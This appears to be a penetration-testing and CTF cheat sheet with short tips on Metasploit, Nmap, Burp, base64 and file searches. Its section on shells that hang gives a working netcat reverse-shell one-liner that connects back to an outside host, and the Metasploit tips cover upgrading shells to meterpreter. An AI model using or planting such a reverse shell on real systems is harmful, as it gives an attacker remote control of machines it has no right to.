# General tips

## Disposable email

If you are signing up for a lot of accounts you can use a disposable email. You just enter the email account you want for that second, and then you can view it. But remember, so can everyone else.  
[https://www.mailinator.com](https://www.mailinator.com)

## Base64 encode/decode

```python
import base64

encoded = base64.b64encode("String to encode")
print encoded

decoded = base64.b64decode("aGVqc2Fu")
print decoded
```

## Quick Base64 Decoder

```
echo aGVsbG8gd2hpdGUgaGF0Cg== | base64 -d
```

## Metasploit Slow Search Fix

```
db_rebuild_cache
```

## Default passwords

[http://www.defaultpassword.com/](http://www.defaultpassword.com/)

## Getting GUI on machine that does not have RDP or VNC

You can forward X over SSH.  
[http://www.vanemery.com/Linux/XoverSSH/X-over-SSH2.html](http://www.vanemery.com/Linux/XoverSSH/X-over-SSH2.html)

## Metasploit shell upgrade

In metasploit framework, if we have a shell \( you should try this also, when you are trying to interact with a shell and it dies \(happened in a VM\), we can upgrade it to meterpreter by using sessions -u

```
sessions -h
Usage: sessions [options]

Active session manipulation and interaction.

OPTIONS:

-u <opt>  Upgrade a shell to a meterpreter session on many platforms
```

## **Using a list in a metasploit module that does not allow it**

```
In the RHOSTS field enter:

file://PATHTOIPADDRESSES
```

## **Change Nmap modes while scanning**

```
v   --increase verbosity
p   --turn on packets
```

## **Nmap host enumeration**

```
-sn --determine alive hosts
```

## Issues with Exploits \(try viewing in Burp\)

```
Options->Add(proxy Listeners)->
Bind to port (i.e.local port to bind)(e.g.8500)->
Request Handling->
Redirect to host(i.e.IP of target)(e.g.8500)->
Redirect to port(i.e.Port of target)(e.g.8500)

then browser
localhost:8500
or run the exploit again
```

## Quick determination if executables exist

```
which nc
```

## Makes Sure shells don't hang \(send to background\)

```
If adding a reverse shell to web console for example, add a "&" to the end of reverse shell, to send to background
and in case any process during interaction hangs
for example:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f &
```

## Modification of Files \(CTF specific / IR trick\)

look for other files modified after initial flag file or other indicator

```
find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24
```

above example the user flag was uploaded aug 22 2017

